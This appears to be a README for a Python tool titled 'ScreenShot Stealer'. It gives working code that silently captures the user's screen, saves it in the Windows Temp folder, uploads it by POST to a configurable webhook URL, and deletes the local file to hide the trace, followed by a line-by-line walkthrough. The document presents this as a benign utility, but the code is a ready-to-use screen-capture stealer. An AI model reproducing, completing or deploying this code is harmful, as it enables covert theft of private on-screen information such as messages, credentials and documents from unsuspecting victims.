## ScreenShot Stealer

This Python script allows you to capture a screenshot of your computer screen and upload it to a specified URL using the Requests library. The captured screenshot is saved in a temporary folder and then uploaded using a POST request with the file attached.

## Code Example

```python
import os.path, requests, os
from PIL import ImageGrab

lizzard = os.path.expanduser("~")

verifiedWH = ""

otter = ImageGrab.grab()
otter.save(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png")

file = {"file": open(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png", "rb")}
r = requests.post(verifiedWH, files=file)
try:
    os.remove(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png")
except:
    pass

```

## Explanation

1. os.path.expanduser("~"): This line of code retrieves the current user's home directory as a string.
2. verifiedWH = "": This variable should be replaced with the URL where the file will be uploaded.
3. otter = ImageGrab.grab(): This line captures a screenshot of the screen and saves it as a PIL Image object.
4. otter.save(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png"): This line saves the PIL Image object as a PNG file in a temporary folder.
5. file = {"file": open(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png", "rb")}: This line creates a dictionary with a key "file" and a value that is the opened PNG file in binary read mode.
6. r = requests.post(verifiedWH, files=file): This line sends a POST request to the URL specified in verifiedWH with the PNG file attached.
7. try: os.remove(lizzard+"\\AppData\\Local\\Temp\\lizzardScreen.png") except: pass: This line attempts to delete the temporary PNG file. If it is unable to do so, it continues without raising an error.
